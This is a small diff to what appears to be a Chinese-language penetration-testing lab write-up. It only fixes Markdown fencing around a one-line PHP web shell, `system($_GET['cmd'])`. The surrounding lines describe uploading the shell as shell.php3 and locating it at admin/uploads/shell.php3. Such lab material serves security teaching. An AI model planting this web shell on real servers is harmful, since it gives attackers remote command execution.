@@ -50,7 +50,8 @@
 	```
 	<?php
 	  system($_GET['cmd']);
-	?>```
+	?>
+	```
 	* ![](image/upload_php.png)
 	* 通过浏览器的网页编辑功能找到上传的shell.php3在web服务器端的保存位置，位置为`admin/uploads/shell.php3`
 	* ![](image/img_src.png)
